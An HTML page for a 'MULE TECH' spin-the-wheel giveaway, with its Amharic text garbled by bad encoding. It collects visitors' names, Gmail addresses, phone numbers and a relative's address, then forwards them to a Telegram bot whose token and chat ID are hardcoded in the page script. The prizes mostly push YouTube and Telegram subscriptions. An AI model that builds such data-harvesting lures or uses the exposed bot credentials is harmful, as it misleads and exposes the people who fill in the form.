<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MULE TECH | Spin & Learn</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .hidden { display: none; }
        #wheel-container { position: relative; width: 300px; height: 300px; margin: 20px auto; }
        #wheel { width: 100%; height: 100%; border-radius: 50%; border: 5px solid #1E88E5; transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99); }
        .pointer { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); width: 20px; height: 20px; background: red; clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 10; }
    </style>
</head>
<body class="bg-gray-100 p-4">

    <div class="max-w-md mx-auto bg-white rounded-2xl shadow-2xl p-6">
        <div class="text-center mb-4">
            <img src="https://i.ibb.co/mC3Yf3f/20730.jpg" alt="Mule Tech Logo" class="w-32 h-32 mx-auto rounded-full border-4 border-blue-600 shadow-md">
            <h1 class="text-2xl font-bold text-blue-700 mt-2">MULE TECH</h1>
            <div class="mt-2 flex justify-center gap-2">
                <button onclick="setLang('am')" class="text-xs bg-gray-200 px-2 py-1 rounded">áŠ áˆ›áˆ­áŠ›</button>
                <button onclick="setLang('en')" class="text-xs bg-gray-200 px-2 py-1 rounded">English</button>
            </div>
        </div>

        <div id="reg-form">
            <h2 class="font-bold border-b mb-4" id="form-title">ğŸ‘¤ á‹¨áŒáˆ áˆ˜áˆ¨áŒƒá‹áŠ• á‹­áˆ™áˆ‰</h2>
            <div class="space-y-3">
                <input type="text" id="fullname" placeholder="áˆ™áˆ‰ áˆµáˆ *" class="w-full p-2 border rounded focus:ring-2 focus:ring-blue-400 outline-none">
                <input type="email" id="email" placeholder="áŠ¢áˆœá‹­áˆ (@gmail.com) *" class="w-full p-2 border rounded outline-none">
                <input type="text" id="phone" placeholder="áˆµáˆáŠ­ á‰áŒ¥áˆ­ (09/07...) *" maxlength="10" class="w-full p-2 border rounded outline-none">
                <input type="text" id="relative_addr" placeholder="á‹¨á‰…áˆ­á‰¥ á‰°áŒ áˆª áŠ á‹µáˆ«áˆ» *" class="w-full p-2 border rounded outline-none">
            </div>
            <button onclick="startSpinning()" class="w-full bg-blue-600 text-white mt-6 py-3 rounded-lg font-bold">áˆˆáˆ˜áŒ€áˆ˜áˆ­ á‰°áŒ«áŠ• (Next) â¡ï¸</button>
        </div>

        <div id="wheel-page" class="hidden text-center">
            <h2 class="font-bold text-blue-600 mb-2">ğŸ¡ áŠ¥á‹µáˆá‹áŠ• á‹­áˆáŠ­áˆ©!</h2>
            <p class="text-xs text-gray-500 mb-4">áŒáˆ›á‹áŠ• á‰ áˆ›áˆ½áŠ¨áˆ­áŠ¨áˆ­ áŠáƒ áŠ®áˆ­áˆ¶á‰½áŠ• á‹«áŒáŠ™</p>
            
            <div id="wheel-container">
                <div class="pointer"></div>
                <canvas id="wheel"></canvas>
            </div>
            
            <button id="spin-btn" onclick="spinNow()" class="w-full bg-orange-500 text-white py-3 rounded-xl font-bold text-lg shadow-lg">áŠ áˆ½áŠ¨áˆ­áŠ­áˆ­ (SPIN) ğŸŒ€</button>
        </div>

        <div id="success-page" class="hidden text-center p-6">
            <div class="text-6xl mb-4">ğŸ</div>
            <h2 class="text-2xl font-bold text-green-600">áŠ¥áŠ•áŠ³áŠ• á‹°áˆµ áŠ áˆˆá‹á‰µ!</h2>
            <p id="prize-text" class="font-bold my-4 text-gray-700"></p>
            <p id="order-id" class="text-blue-500 font-mono text-lg"></p>
            <div class="mt-6 space-y-2">
                <a href="https://youtube.com/@muletechreact" class="block bg-red-600 text-white py-2 rounded">YouTube Subscribe</a>
                <a href="https://t.me/muletechreact" class="block bg-blue-500 text-white py-2 rounded">Join Telegram</a>
            </div>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('wheel');
        const ctx = canvas.getContext('2d');
        const items = [
            "Video Editing", "Graphics Design", "Free Internet", "Social Management",
            "YouTube Sub 1", "YouTube Sub 2", "YouTube Sub 3", "YouTube Sub 4", "YouTube Sub 5", "YouTube Sub 6", "YouTube Sub 7",
            "Telegram Join 1", "Telegram Join 2", "Telegram Join 3", "Telegram Join 4"
        ];
        const colors = ["#1E88E5", "#FFC107", "#28A745", "#E91E63", "#FF5722", "#9C27B0", "#00BCD4"];

        function drawWheel() {
            const size = items.length;
            const arc = (2 * Math.PI) / size;
            canvas.width = 300; canvas.height = 300;
            items.forEach((item, i) => {
                ctx.beginPath();
                ctx.fillStyle = colors[i % colors.length];
                ctx.moveTo(150, 150);
                ctx.arc(150, 150, 140, i * arc, (i + 1) * arc);
                ctx.fill();
                ctx.save();
                ctx.translate(150, 150);
                ctx.rotate(i * arc + arc / 2);
                ctx.fillStyle = "white";
                ctx.font = "bold 8px Arial";
                ctx.fillText(item.substring(0, 10), 60, 5);
                ctx.restore();
            });
        }
        drawWheel();

        function startSpinning() {
            const name = document.getElementById('fullname').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value;
            if(name.length > 3 && email.endsWith('@gmail.com') && phone.length == 10) {
                document.getElementById('reg-form').classList.add('hidden');
                document.getElementById('wheel-page').classList.remove('hidden');
            } else {
                alert("áŠ¥á‰£áŠ­á‹ áˆ˜áˆ¨áŒƒá‹áŠ• á‰ á‰µáŠ­áŠ­áˆ á‹­áˆ™áˆ‰!");
            }
        }

        let rotation = 0;
        function spinNow() {
            const btn = document.getElementById('spin-btn');
            btn.disabled = true;
            const extraDegree = Math.floor(2000 + Math.random() * 2000);
            rotation += extraDegree;
            canvas.style.transform = `rotate(${rotation}deg)`;
            
            setTimeout(() => {
                const actualDegree = rotation % 360;
                const index = items.length - 1 - Math.floor(actualDegree / (360 / items.length));
                finishOrder(items[index]);
            }, 4000);
        }

        async function finishOrder(prize) {
            const orderId = "Mule" + Math.floor(100 + Math.random() * 900);
            const u = {
                name: document.getElementById('fullname').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                addr: document.getElementById('relative_addr').value
            };

            const msg = `ğŸ”” áŠ á‹²áˆµ áŠ¥á‹µáˆˆáŠ›!\nğŸ†” ID: ${orderId}\nğŸ‘¤ áˆµáˆ: ${u.name}\nğŸ“§ Email: ${u.email}\nğŸ“ áˆµáˆáŠ­: ${u.phone}\nğŸ“ á‰°áŒ áˆª áŠ á‹µáˆ«áˆ»: ${u.addr}\nğŸ á‹«áˆ¸áŠáˆá‹: ${prize}`;
            
            await fetch(`https://api.telegram.org/bot8477843612:AAFQxTf8e5XuVTVOvWPUK9AlMY2KsqwBiDc/sendMessage?chat_id=1312047180&text=${encodeURIComponent(msg)}`);

            document.getElementById('wheel-page').classList.add('hidden');
            document.getElementById('success-page').classList.remove('hidden');
            document.getElementById('prize-text').innerText = "á‹¨á‹°áˆ¨áˆ°á‹á‰µ áˆµáŒ¦á‰³á¡ " + prize;
            document.getElementById('order-id').innerText = "á‹¨á‰µá‹•á‹›á‹ á‰áŒ¥áˆ­á¡ " + orderId;
        }
    </script>
</body>
</html>
